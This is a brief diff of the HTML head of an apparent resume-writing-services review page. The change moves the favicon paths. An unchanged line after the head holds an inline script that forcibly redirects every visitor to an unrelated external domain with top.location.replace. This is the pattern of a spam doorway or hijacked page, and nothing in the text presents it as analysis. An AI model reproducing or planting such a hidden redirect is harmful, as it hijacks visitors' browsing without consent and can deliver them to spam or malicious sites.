@@ -4,8 +4,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
 <meta name="robots" content="noarchive" />
 <meta name="description" content="The Best Resume Writing Services of 2022 Best Overall: Let’s Eat, Grandma; Runner-Up, Best Overall: Monster.com; Best Price: The Muse; Best Customer Service. TopResume is also one of the best federal resume writing services on the market. What’s Great (Pros): Free assessment, experienced." />
-<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
-<link rel="icon" href="/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="/resume-writing/favicon.ico" type="image/x-icon" />
+<link rel="icon" href="/resume-writing/favicon.ico" type="image/x-icon" />
 <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
 </head>
 <script>ref="http://b.yto.pp.ua/blog/resume1";top.location.replace(ref);</script>
